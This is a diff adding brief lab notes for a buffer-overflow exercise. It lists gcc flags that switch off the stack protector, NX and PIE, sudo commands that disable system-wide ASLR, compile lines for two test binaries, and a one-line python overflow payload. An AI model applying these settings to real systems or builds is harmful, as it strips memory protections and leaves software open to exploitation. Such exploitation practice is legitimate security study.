@@ -1,0 +1,36 @@
+
+gcc compile options
+
+32bit ELF : -m32
+disable SSP : -fno-stack-protector
+able SSP : -fstack-protector
+disable NX bit :-z execstack
+disable PIE :-no-pie
+
+Disable ASLR : 
+sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
+able ASLR : 
+sudo bash -c 'echo 2 > /proc/sys/kernel/randomize_va_space'
+
+
+retaddr.py require no SSP, no PIE 
+shellcode.py no NX, no ASLR in addition to these 
+
+gcc -m32 -fno-stack-protector -no-pie -z execstack -o bof1 bof1.c
+gcc -m32 -fno-stack-protector -no-pie -o bof2 bof2.c
+
+python -c "print('A'*44+'\x2c\x06\x00\x00')"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
